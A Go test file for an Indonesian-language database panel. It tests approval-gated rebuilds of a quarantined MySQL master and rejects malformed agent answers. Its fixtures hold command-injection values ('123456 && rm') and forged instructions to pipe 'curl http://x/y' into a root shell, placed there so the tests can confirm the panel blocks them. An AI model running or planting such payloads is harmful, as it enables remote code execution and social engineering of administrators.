package orchestrator

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"log/slog"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/husmin-fajrin/db-panel/internal/agent/commands"
	"github.com/husmin-fajrin/db-panel/internal/panel/store"
	"github.com/husmin-fajrin/db-panel/internal/proto"
)

// rebuildRig is a promote rig after the promotion and the cutover: the old
// master g.m is quarantined, has no connections and its agent answers a
// rebuild like an empty target (approved by root on it); the new master
// g.c serves the copy.
func rebuildRig(t *testing.T) *promoteRig {
	t.Helper()
	g := newPromoteRig(t)
	e := g.e
	id, err := e.r.StartPromote(context.Background(), PromoteParams{MasterServerID: g.m.id, CandidateServerID: g.c.id})
	if err != nil {
		t.Fatalf("StartPromote: %v", err)
	}
	e.waitJob(id, store.JobSucceeded)
	if err := e.st.SetCutoverPending(g.topo.ID, false); err != nil {
		t.Fatal(err)
	}
	g.m.reply("mysql.connections", proto.ConnectionsResult{Typed: true, TakenAt: time.Now()})
	scriptReplicaTarget(g.m, "db-master", "clone")
	g.c.reply("mysql.status", masterStatus())
	g.c.reply("mysql.createDumpUser", nil)
	g.c.reply("mysql.dropUser", nil)
	g.c.reply("mysql.sweepDumpUsers", proto.SweepDumpUsersResult{})
	return g
}

func (g *promoteRig) startRebuild() (string, error) {
	return g.e.r.StartCreateReplica(context.Background(), CreateReplicaParams{MasterServerID: g.c.id,
		TargetServerID: g.m.id, RebuildOldMaster: true, ConfirmWipe: true})
}

func notApproved(code string) proto.RebuildApprovalResult {
	return proto.RebuildApprovalResult{Required: true, Code: code, Source: "10.0.0.1:3306", RemainingSec: 1700}
}

// noRebuildStarted fails unless the old master has no replica row and no
// job for it exists.
func noRebuildStarted(t *testing.T, g *promoteRig) {
	t.Helper()
	if _, err := g.e.st.GetReplicaByServer(g.m.id); !errors.Is(err, store.ErrNotFound) {
		t.Fatalf("refused rebuild registered a replica: %v", err)
	}
	if j, busy, err := g.e.st.ActiveJobForServer(g.m.id); err != nil || busy {
		t.Fatalf("refused rebuild left a job: %+v, %v", j, err)
	}
}

// TestRebuildRefusedWithoutApproval: without root's approval on the old
// master its rebuild does not start; the refusal names the command and
// the code, and only the reads reach the old master.
func TestRebuildRefusedWithoutApproval(t *testing.T) {
	g := rebuildRig(t)
	g.m.reply("mysql.rebuildApproval", notApproved("123456"))
	mark := g.m.mark()
	_, err := g.startRebuild()
	if !errors.Is(err, ErrRebuildNeedsApproval) {
		t.Fatalf("StartCreateReplica = %v, want ErrRebuildNeedsApproval", err)
	}
	want := "Bangun ulang db-master butuh persetujuan di server itu. Jalankan di server itu sebagai root: " +
		"sudo dbpanel agent approve 123456, lalu coba lagi."
	if err.Error() != want {
		t.Fatalf("refusal = %q, want %q", err, want)
	}
	noRebuildStarted(t, g)
	wantCmds(t, "old master", g.m.cmds(mark), []string{"mysql.connections", "mysql.rebuildApproval"})
}

// TestRebuildRefusedOnOldAgent: an agent that does not know the approval
// cannot be rebuilt by this panel (global constraints: panel new, agent
// old).
func TestRebuildRefusedOnOldAgent(t *testing.T) {
	g := rebuildRig(t)
	g.m.oldAgent("mysql.rebuildApproval")
	_, err := g.startRebuild()
	if !errors.Is(err, ErrAgentOutdated) {
		t.Fatalf("StartCreateReplica = %v, want ErrAgentOutdated", err)
	}
	if !strings.Contains(err.Error(), "Agent perlu dimutakhirkan") || !strings.Contains(err.Error(), "db-master") {
		t.Fatalf("refusal = %q", err)
	}
	noRebuildStarted(t, g)
}

// TestRebuildNotRequiredProceeds: an agent that does not hold the server
// quarantined needs no approval.
func TestRebuildNotRequiredProceeds(t *testing.T) {
	g := rebuildRig(t)
	g.m.reply("mysql.rebuildApproval", proto.RebuildApprovalResult{Required: false})
	id, err := g.startRebuild()
	if err != nil {
		t.Fatalf("StartCreateReplica: %v", err)
	}
	g.e.waitJob(id, store.JobSucceeded)
}

// TestRebuildRetryAndApproveRecheckApproval: Ulangi and Setujui of the
// rebuild ask the old master's agent again; an approval that no longer
// holds refuses them and leaves the job as it was.
func TestRebuildRetryAndApproveRecheckApproval(t *testing.T) {
	g := rebuildRig(t)
	e := g.e
	g.m.fail("mysql.preflight", "pemeriksaan gagal")
	id, err := g.startRebuild()
	if err != nil {
		t.Fatal(err)
	}
	e.waitJob(id, store.JobFailed)
	e.waitIdle(id)

	g.m.reply("mysql.rebuildApproval", notApproved("123456"))
	mark := g.m.mark()
	err = e.r.Retry(id, JobAck{Confirmed: true})
	if !errors.Is(err, ErrRebuildNeedsApproval) || !strings.Contains(err.Error(), "sudo dbpanel agent approve 123456") {
		t.Fatalf("Retry = %v, want ErrRebuildNeedsApproval", err)
	}
	if j, _, _ := e.st.GetJob(id); j.Status != store.JobFailed {
		t.Fatalf("job after a refused retry = %+v", j)
	}
	for _, c := range g.m.cmds(mark) {
		if c != "mysql.connections" && c != "mysql.rebuildApproval" {
			t.Fatalf("refused retry sent %s to the old master", c)
		}
	}
	// An old agent: refused too.
	g.m.oldAgent("mysql.rebuildApproval")
	if err := e.r.Retry(id, JobAck{Confirmed: true}); !errors.Is(err, ErrAgentOutdated) ||
		!strings.Contains(err.Error(), "Agent perlu dimutakhirkan") {
		t.Fatalf("Retry on an old agent = %v, want ErrAgentOutdated", err)
	}

	// Waiting to drop leftovers: Setujui asks again.
	g.m.mu.Lock()
	delete(g.m.unknown, "mysql.rebuildApproval")
	g.m.mu.Unlock()
	j, _, _ := e.st.GetJob(id)
	if err := e.st.ReopenJob(id, time.Now()); err != nil {
		t.Fatal(err)
	}
	if err := e.st.UpdateJob(id, store.JobWaiting, j.CurrentStep, "", time.Now()); err != nil {
		t.Fatal(err)
	}
	e.setState(id, func(st *jobState) { st.WaitReason = WaitWipe })
	if err := e.r.Approve(id, JobAck{Confirmed: true}); !errors.Is(err, ErrRebuildNeedsApproval) {
		t.Fatalf("Approve = %v, want ErrRebuildNeedsApproval", err)
	}
	if j, _, _ := e.st.GetJob(id); j.Status != store.JobWaiting {
		t.Fatalf("job after a refused approval = %+v", j)
	}

	// Approved again: the retry runs.
	scriptReplicaTarget(g.m, "db-master", "clone")
	if err := e.r.Retry(id, JobAck{Confirmed: true}); err != nil {
		t.Fatalf("approved retry: %v", err)
	}
	e.waitJob(id, store.JobSucceeded)
}

// TestRebuildDecisionHandedBack: Start, Retry and Approve of a rebuild
// hand back the approval answer they decided on (the audit records it).
func TestRebuildDecisionHandedBack(t *testing.T) {
	g := rebuildRig(t)
	e := g.e
	approved := proto.RebuildApprovalResult{Required: true, Approved: true, Source: "10.0.0.1:3306", Addr: "10.0.0.1",
		RemainingSec: 86000, AgeSec: 60}
	g.m.reply("mysql.rebuildApproval", approved)
	g.m.fail("mysql.preflight", "pemeriksaan gagal")
	var seen ApprovalSeen
	id, err := e.r.StartCreateReplica(context.Background(), CreateReplicaParams{MasterServerID: g.c.id,
		TargetServerID: g.m.id, RebuildOldMaster: true, ConfirmWipe: true, Approval: &seen})
	if err != nil {
		t.Fatal(err)
	}
	if !seen.Read || seen.Result != approved {
		t.Fatalf("start handed back %+v", seen)
	}
	e.waitJob(id, store.JobFailed)
	e.waitIdle(id)

	g.m.reply("mysql.rebuildApproval", notApproved("123456"))
	seen = ApprovalSeen{}
	if err := e.r.Retry(id, JobAck{Confirmed: true, Approval: &seen}); !errors.Is(err, ErrRebuildNeedsApproval) {
		t.Fatalf("Retry = %v", err)
	}
	if !seen.Read || seen.Result != notApproved("123456") {
		t.Fatalf("retry handed back %+v", seen)
	}
	g.m.reply("mysql.rebuildApproval", unusableApprovals["hostile code"])
	seen = ApprovalSeen{Read: true}
	if err := e.r.Approve(id, JobAck{Confirmed: true, Approval: &seen}); err == nil {
		t.Fatal("Approve passed")
	}
	if seen.Read || seen.Result != (proto.RebuildApprovalResult{}) {
		t.Fatalf("approve of an unusable answer handed back %+v", seen)
	}
}

// TestRetryRefusesUnreadableCreateReplicaParams: a create_replica job
// whose params cannot be read is refused, not let through without asking
// the agent (it may be a rebuild).
func TestRetryRefusesUnreadableCreateReplicaParams(t *testing.T) {
	g := rebuildRig(t)
	e := g.e
	g.m.fail("mysql.preflight", "pemeriksaan gagal")
	id, err := g.startRebuild()
	if err != nil {
		t.Fatal(err)
	}
	e.waitJob(id, store.JobFailed)
	e.waitIdle(id)
	if err := e.st.SetJobParams(id, "{rusak"); err != nil {
		t.Fatal(err)
	}
	mark := g.m.mark()
	for name, do := range map[string]func() error{
		"retry":   func() error { return e.r.Retry(id, JobAck{Confirmed: true}) },
		"approve": func() error { return e.r.Approve(id, JobAck{Confirmed: true}) },
	} {
		err := do()
		if err == nil || !strings.Contains(err.Error(), "parameter pekerjaan ini tidak bisa dibaca") {
			t.Fatalf("%s = %v, want refused", name, err)
		}
	}
	if j, _, _ := e.st.GetJob(id); j.Status != store.JobFailed {
		t.Fatalf("job after a refused retry = %+v", j)
	}
	for _, c := range g.m.cmds(mark) {
		if c != "mysql.connections" {
			t.Fatalf("refused retry sent %s to the old master", c)
		}
	}
}

// TestNeedsLocalApprovalMidJobNamesCommand: a step refused by strict mode
// on the old master (its approval ran out meanwhile) fails the job with
// the command to run there and the code, read from the agent.
func TestNeedsLocalApprovalMidJobNamesCommand(t *testing.T) {
	g := rebuildRig(t)
	e := g.e
	g.m.on("mysql.configure", func(json.RawMessage) (any, error) {
		// The approval no longer holds once the job runs; the agent
		// made a new request.
		g.m.reply("mysql.rebuildApproval", notApproved("654321"))
		return nil, &commands.LocalActionError{Msg: "server ini dikarantina (quarantined) mengikuti sumber 10.0.0.1:3306; " +
			"perintah mysql.configure butuh persetujuan root di server ini. Jalankan di server ini: sudo dbpanel agent " +
			"approve 654321 (kode berlaku 30 menit lagi)"}
	})
	id, err := g.startRebuild()
	if err != nil {
		t.Fatal(err)
	}
	j, _ := e.waitJob(id, store.JobFailed)
	want := "Server db-master dikarantina (quarantined): langkah ini butuh persetujuan di server itu. Jalankan di server itu " +
		"sebagai root: sudo dbpanel agent approve 654321, lalu klik Ulangi."
	if j.Error != want {
		t.Fatalf("job error = %q, want %q", j.Error, want)
	}
}

// TestCallWithinLocalApprovalMapping: needs_local_approval of any command
// but mysql.releaseRole becomes P12 (P12b when the code cannot be read);
// releaseRole's own refusal names another local command and passes in
// the agent's words, quoted as the agent's (P-2).
func TestCallWithinLocalApprovalMapping(t *testing.T) {
	e := newEnv(t)
	fa := e.agent("db-old", "10.0.0.9")
	jr := &jobRun{r: e.r, steps: []step{{title: "Langkah"}}}
	ctx := context.Background()

	release := "server ini dikarantina (quarantined); perintah mysql.releaseRole ditolak. Karantina hanya lepas lewat " +
		"bangun ulang yang selesai, atau dengan perintah di server ini: sudo dbpanel agent set-role unassigned"
	fa.failCode("mysql.releaseRole", release)
	fa.reply("mysql.rebuildApproval", notApproved("222222"))
	err := jr.call(ctx, fa.id, "mysql.releaseRole", nil, nil)
	if !errors.Is(err, &proto.Error{Code: proto.CodeNeedsLocalApproval}) ||
		err.Error() != "Pesan dari agent db-old (bukan dari panel): "+release {
		t.Fatalf("releaseRole refusal = %v, want the agent's own, quoted", err)
	}
	// Made one line and cut, whatever the agent sends.
	fa.failCode("mysql.releaseRole", "baris satu\n\u202ebaris dua "+strings.Repeat("x", 400))
	err = jr.call(ctx, fa.id, "mysql.releaseRole", nil, nil)
	if got := err.Error(); !strings.HasPrefix(got, "Pesan dari agent db-old (bukan dari panel): baris satu baris dua x") ||
		strings.ContainsAny(got, "\n\u202e") || len(got) > 400 {
		t.Fatalf("hostile releaseRole refusal = %q", got)
	}
	if n := fa.count("mysql.rebuildApproval"); n != 0 {
		t.Fatalf("releaseRole refusal read the approval %d times", n)
	}

	fa.failCode("mysql.stopReplica", "butuh persetujuan")
	err = jr.call(ctx, fa.id, "mysql.stopReplica", nil, nil)
	var se stepError
	if !errors.As(err, &se) || !strings.Contains(err.Error(), "sudo dbpanel agent approve 222222, lalu klik Ulangi.") {
		t.Fatalf("stopReplica refusal = %v, want P12", err)
	}

	for name, set := range map[string]func(){
		"old agent":     func() { fa.oldAgent("mysql.rebuildApproval") },
		"agent refuses": func() { fa.fail("mysql.rebuildApproval", "pin peran/sumber agent tidak bisa dipakai") },
	} {
		set()
		err = jr.call(ctx, fa.id, "mysql.stopReplica", nil, nil)
		want := "Server db-old dikarantina (quarantined): langkah ini butuh persetujuan di server itu. Buka form Bangun ulang " +
			"sebagai replika, klik Periksa lagi, jalankan perintah yang ditampilkan di server itu, lalu klik Ulangi."
		if !errors.As(err, &se) || err.Error() != want {
			t.Fatalf("%s: stopReplica refusal = %v, want P12b", name, err)
		}
	}

	// Other errors pass as they are.
	fa.fail("mysql.startReplica", "gagal")
	if err := jr.call(ctx, fa.id, "mysql.startReplica", nil, nil); err == nil || err.Error() != "gagal" {
		t.Fatalf("other error = %v", err)
	}
}

// TestTLSSkipsQuarantined: the daily renewal leaves a quarantined server
// alone, and a new certificate for it is refused (it gets one when it is
// rebuilt).
func TestTLSSkipsQuarantined(t *testing.T) {
	g := rebuildRig(t)
	e := g.e
	if srv, _ := e.st.GetServer(g.m.id); srv.Role != store.RoleQuarantined {
		t.Fatalf("old master role = %s", srv.Role)
	}
	if err := e.st.SetServerTLS(store.ServerTLS{ServerID: g.m.id, CertSerial: "01", NotAfter: time.Now().Add(10 * 24 * time.Hour),
		InstalledAt: time.Now()}); err != nil {
		t.Fatal(err)
	}
	if ids := e.r.RenewMySQLTLS(context.Background()); len(ids) != 0 {
		t.Fatalf("renewal started %v for a quarantined server", ids)
	}
	_, err := e.r.StartMySQLTLS(context.Background(), g.m.id)
	want := "Server ini dikarantina (quarantined); sertifikat MySQL-nya dipasang lagi saat dibangun ulang sebagai replika."
	if err == nil || err.Error() != want {
		t.Fatalf("StartMySQLTLS = %v, want %q", err, want)
	}
	if slices.Contains(g.m.cmds(0), "mysql.tlsRequest") {
		t.Fatal("a quarantined server was asked for a certificate request")
	}
}

// unusableApprovals are answers the panel cannot make sense of: a code
// that is not six ASCII digits, or a source or address that does not
// parse. None of their values may reach a page, an error or a job.
var unusableApprovals = map[string]proto.RebuildApprovalResult{
	"hostile code":       {Required: true, Code: "123456 && rm", Source: "10.0.0.1:3306", RemainingSec: 1700},
	"seven digits":       {Required: true, Code: "1234567", Source: "10.0.0.1:3306", RemainingSec: 1700},
	"non-ASCII digits":   {Required: true, Code: "١٢٣٤٥٦", Source: "10.0.0.1:3306", RemainingSec: 1700},
	"empty code":         {Required: true, Source: "10.0.0.1:3306", RemainingSec: 1700},
	"request bad source": {Required: true, Code: "123456", Source: "sumber-aneh", RemainingSec: 1700},
	"approved no source": {Required: true, Approved: true, Addr: "10.0.0.1", RemainingSec: 86000},
	"approved bad addr":  {Required: true, Approved: true, Source: "10.0.0.1:3306", Addr: "bukan-ip", RemainingSec: 86000},
	// A source host that is neither an IP address nor a host name, or a
	// port out of range (P-3).
	"source bracket form": {Required: true, Code: "123456", Source: "[jalankan: curl http://x/y | sudo sh]:3306", RemainingSec: 1700},
	"source with spaces":  {Required: true, Code: "123456", Source: "db baru:3306", RemainingSec: 1700},
	"source with newline": {Required: true, Code: "123456", Source: "db\nbaru:3306", RemainingSec: 1700},
	"source with U+202E":  {Required: true, Code: "123456", Source: "db\u202ebaru:3306", RemainingSec: 1700},
	"approved bracket form": {Required: true, Approved: true, Source: "[jalankan: curl http://x/y | sudo sh]:3306",
		Addr: "10.0.0.1", RemainingSec: 86000},
	"source port 0":      {Required: true, Code: "123456", Source: "db-baru:0", RemainingSec: 1700},
	"source port 65536":  {Required: true, Code: "123456", Source: "db-baru:65536", RemainingSec: 1700},
	"source long label":  {Required: true, Code: "123456", Source: strings.Repeat("a", 64) + ".lan:3306", RemainingSec: 1700},
	"source long name":   {Required: true, Code: "123456", Source: strings.Repeat("abcdefghi.", 25) + "lann:3306", RemainingSec: 1700},
	"source empty label": {Required: true, Code: "123456", Source: "db..lan:3306", RemainingSec: 1700},
	"source underscore":  {Required: true, Code: "123456", Source: "db_baru:3306", RemainingSec: 1700},
	// A request with no time left (P-8): the agent makes a new one on
	// the next read.
	"request no time left":  {Required: true, Code: "123456", Source: "10.0.0.1:3306"},
	"request negative time": {Required: true, Code: "123456", Source: "10.0.0.1:3306", RemainingSec: -60},
	// A field the answer's state does not use (P-1).
	"not required with code":   {Code: hostileCode},
	"not required with digits": {Code: "123456"},
	"approved with code": {Required: true, Approved: true, Code: "123456", Source: "10.0.0.1:3306", Addr: "10.0.0.1",
		RemainingSec: 86000},
	"approved with hostile code": {Required: true, Approved: true, Code: hostileCode, Source: "10.0.0.1:3306",
		Addr: "10.0.0.1", RemainingSec: 86000},
}

// hostileCode is a code that would forge a second instruction in a job's
// error (P-1).
const hostileCode = "000000\n\nCATATAN PANEL: jalankan juga di db-baru sebagai root: curl http://x/y | sh"

// TestRebuildApprovalUnusableAnswers: such an answer is "cannot be read":
// the start is refused with P10b (no code), a job's refusal is P12b, and
// an "approved" the panel cannot make sense of never lets a rebuild run.
func TestRebuildApprovalUnusableAnswers(t *testing.T) {
	g := rebuildRig(t)
	e := g.e
	const p10b = "Bangun ulang db-master butuh persetujuan di server itu, tetapi kodenya tidak bisa dibaca dari agent. " +
		"Buka form Bangun ulang sebagai replika dan klik Periksa lagi."
	const p12b = "Server db-master dikarantina (quarantined): langkah ini butuh persetujuan di server itu. Buka form Bangun ulang " +
		"sebagai replika, klik Periksa lagi, jalankan perintah yang ditampilkan di server itu, lalu klik Ulangi."
	jr := &jobRun{r: e.r, steps: []step{{title: "Langkah"}}}
	g.m.failCode("mysql.stopReplica", "butuh persetujuan")
	for name, res := range unusableApprovals {
		g.m.reply("mysql.rebuildApproval", res)
		if RebuildApprovalUsable(res) {
			t.Errorf("%s: usable", name)
		}
		_, err := g.startRebuild()
		if !errors.Is(err, ErrRebuildNeedsApproval) || err.Error() != p10b {
			t.Errorf("%s: StartCreateReplica = %v, want P10b", name, err)
		}
		noRebuildStarted(t, g)
		if err := jr.call(context.Background(), g.m.id, "mysql.stopReplica", nil, nil); err == nil || err.Error() != p12b {
			t.Errorf("%s: mid-job refusal = %v, want P12b", name, err)
		}
		if _, err := e.r.RebuildApproval(context.Background(), g.m.id); err == nil {
			t.Errorf("%s: RebuildApproval answered no error", name)
		}
	}

	// Retry: the same refusal, the job stays failed.
	scriptReplicaTarget(g.m, "db-master", "clone")
	g.m.fail("mysql.preflight", "pemeriksaan gagal")
	id, err := g.startRebuild()
	if err != nil {
		t.Fatal(err)
	}
	e.waitJob(id, store.JobFailed)
	e.waitIdle(id)
	g.m.reply("mysql.rebuildApproval", unusableApprovals["hostile code"])
	if err := e.r.Retry(id, JobAck{Confirmed: true}); err == nil || err.Error() != p10b {
		t.Fatalf("Retry = %v, want P10b", err)
	}
	if j, _, _ := e.st.GetJob(id); j.Status != store.JobFailed || strings.Contains(j.Error, "rm") {
		t.Fatalf("job after a refused retry = %+v", j)
	}
}

// TestHostileApprovalCodeNeverReachesJob: a step refused with
// needs_local_approval whose approval answer carries a code its state does
// not use fails the job with P12b; the code reaches neither the job's
// error, its step messages, its log nor the replica's last error.
func TestHostileApprovalCodeNeverReachesJob(t *testing.T) {
	for _, name := range []string{"not required with code", "approved with hostile code"} {
		t.Run(name, func(t *testing.T) {
			g := rebuildRig(t)
			e := g.e
			g.m.on("mysql.configure", func(json.RawMessage) (any, error) {
				g.m.reply("mysql.rebuildApproval", unusableApprovals[name])
				return nil, &commands.LocalActionError{Msg: "butuh persetujuan"}
			})
			id, err := g.startRebuild()
			if err != nil {
				t.Fatal(err)
			}
			j, steps := e.waitJob(id, store.JobFailed)
			e.waitIdle(id)
			const p12b = "Server db-master dikarantina (quarantined): langkah ini butuh persetujuan di server itu. Buka form " +
				"Bangun ulang sebagai replika, klik Periksa lagi, jalankan perintah yang ditampilkan di server itu, lalu klik Ulangi."
			if j.Error != p12b {
				t.Fatalf("job error = %q, want P12b", j.Error)
			}
			texts := []string{j.Error}
			for _, s := range steps {
				texts = append(texts, s.Message)
			}
			lines, err := e.st.JobLog(id, 0, 0)
			if err != nil {
				t.Fatal(err)
			}
			for _, l := range lines {
				texts = append(texts, l.Message)
			}
			if rep, err := e.st.GetReplicaByServer(g.m.id); err == nil {
				texts = append(texts, rep.LastError)
			}
			for _, s := range texts {
				if strings.Contains(s, "CATATAN") || strings.Contains(s, "curl") || strings.Contains(s, "approve 123456") ||
					strings.Contains(s, "000000") {
					t.Fatalf("hostile code reached the job: %q", s)
				}
			}
		})
	}
}

// TestUnusableApprovalLogged: the panel's log names the fields of an
// answer it rejected, quoted and cut, on one line (an admin diagnoses a
// broken agent from it).
func TestUnusableApprovalLogged(t *testing.T) {
	e := newEnv(t)
	var buf bytes.Buffer
	e.r.log = slog.New(slog.NewTextHandler(&buf, nil))
	fa := e.agent("db-old", "10.0.0.9")
	res := unusableApprovals["approved with hostile code"]
	res.Invalid = strings.Repeat("y", 500)
	res.InvalidCode = "lain"
	fa.reply("mysql.rebuildApproval", res)
	if _, err := e.r.RebuildApproval(context.Background(), fa.id); err == nil {
		t.Fatal("RebuildApproval answered no error")
	}
	out := buf.String()
	if strings.Count(out, "\n") != 1 {
		t.Fatalf("log is not one line: %q", out)
	}
	for _, want := range []string{"rebuild approval answer not usable", `code=\"000000\\n\\nCATATAN PANEL`,
		`source=\"10.0.0.1:3306\"`, `addr=\"10.0.0.1\"`, `invalid_code=\"lain\"`, "(dipotong)"} {
		if !strings.Contains(out, want) {
			t.Errorf("log %q lacks %q", out, want)
		}
	}
	if strings.Contains(out, strings.Repeat("y", 200)) {
		t.Errorf("log did not cut the agent's text: %q", out)
	}
}

// TestRebuildApprovalUsable: well-formed answers pass the check.
func TestRebuildApprovalUsable(t *testing.T) {
	for _, res := range []proto.RebuildApprovalResult{
		{},
		{Required: true, Code: "012345", Source: "db-baru.lan:3306", RemainingSec: 1700},
		{Required: true, Approved: true, Source: "[fd00::1]:3306", Addr: "fd00::1", RemainingSec: 86000, AgeSec: 60},
		{Required: true, Approved: true, Source: "10.0.0.1:3306", Addr: "10.0.0.1"},
		{Required: true, Code: "123456", Source: "DB-1.rs.example:65535", RemainingSec: 1700},
		{Required: true, Code: "123456", Source: strings.Repeat("a", 63) + ".lan:1", RemainingSec: 1700},
	} {
		if !RebuildApprovalUsable(res) {
			t.Errorf("%+v not usable", res)
		}
	}
}

// TestTightenTLSLeavesOutQuarantined: a quarantined server with a replica
// row (its rebuild failed) gets no tighten steps and no TLS command.
func TestTightenTLSLeavesOutQuarantined(t *testing.T) {
	e := newEnv(t)
	m, topo := e.readyMaster("db-master")
	e.followingReplica(topo, "a")
	q := e.agent("db-old", "10.0.0.9")
	if _, err := e.st.AddReplica(topo.ID, q.id, nil); err != nil {
		t.Fatal(err)
	}
	if err := e.st.SetReplicaState(q.id, store.ReplicaFailed, "gagal"); err != nil {
		t.Fatal(err)
	}
	if err := e.st.SetServerRole(q.id, store.RoleQuarantined); err != nil {
		t.Fatal(err)
	}
	id, err := e.r.StartTightenTLS(context.Background(), m.id)
	if err != nil {
		t.Fatalf("StartTightenTLS: %v", err)
	}
	_, steps := e.waitJob(id, store.JobSucceeded)
	if got, want := stepNames(steps), []string{"Pasang sertifikat di master", "Pasang sertifikat di replica1",
		"Arahkan ulang replica1 dengan verifikasi"}; !slices.Equal(got, want) {
		t.Fatalf("steps = %q, want %q", got, want)
	}
	if st := e.storedState(id); slices.Contains(st.TightenReplicas, q.id) {
		t.Fatalf("tighten replicas %v hold the quarantined server", st.TightenReplicas)
	}
	if n := len(q.cmds(0)); n != 0 {
		t.Fatalf("the quarantined server got %v", q.cmds(0))
	}
}

// TestTightenTLSWaitsForQuarantinedReplicaJob: a quarantined server with
// a job still running (its rebuild) refuses the tighten job as any busy
// replica does; it is left out only when it has no active job.
func TestTightenTLSWaitsForQuarantinedReplicaJob(t *testing.T) {
	e := newEnv(t)
	m, topo := e.readyMaster("db-master")
	e.followingReplica(topo, "a")
	q := e.agent("db-old", "10.0.0.9")
	if _, err := e.st.AddReplica(topo.ID, q.id, nil); err != nil {
		t.Fatal(err)
	}
	if err := e.st.SetServerRole(q.id, store.RoleQuarantined); err != nil {
		t.Fatal(err)
	}
	if err := e.st.CreateJob(store.Job{ID: "rebuild", Kind: KindCreateReplica, ServerID: q.id, TopologyID: topo.ID,
		ParamsJSON: `{"rebuild_old_master":true}`, CreatedAt: time.Now()}, []string{"x"}); err != nil {
		t.Fatal(err)
	}
	_, err := e.r.StartTightenTLS(context.Background(), m.id)
	if !errors.Is(err, ErrBusy) || !strings.Contains(err.Error(), "db-old") {
		t.Fatalf("StartTightenTLS with the quarantined server's rebuild running = %v, want busy", err)
	}
}

// TestRetryMySQLTLSRefusedWhenQuarantined: a mysql_tls job that failed
// before its server was quarantined is not retried (P15).
func TestRetryMySQLTLSRefusedWhenQuarantined(t *testing.T) {
	e := newEnv(t)
	q := e.connectedMaster("db-old")
	const id = "4444444444444444444444444444444a"
	if err := e.st.CreateJob(store.Job{ID: id, Kind: KindMySQLTLS, ServerID: q.id, ParamsJSON: "{}", CreatedAt: time.Now()},
		mysqlTLSStepNames()); err != nil {
		t.Fatal(err)
	}
	if err := e.st.UpdateJob(id, store.JobFailed, 0, "gagal", time.Now()); err != nil {
		t.Fatal(err)
	}
	if err := e.st.SetServerRole(q.id, store.RoleQuarantined); err != nil {
		t.Fatal(err)
	}
	err := e.r.Retry(id, JobAck{})
	if err == nil || err.Error() != "Server ini dikarantina (quarantined); sertifikat MySQL-nya dipasang lagi saat dibangun ulang sebagai replika." {
		t.Fatalf("Retry = %v, want P15", err)
	}
	if j, _, _ := e.st.GetJob(id); j.Status != store.JobFailed {
		t.Fatalf("job after a refused retry = %+v", j)
	}
	if n := len(q.cmds(0)); n != 0 {
		t.Fatalf("the quarantined server got %v", q.cmds(0))
	}
}
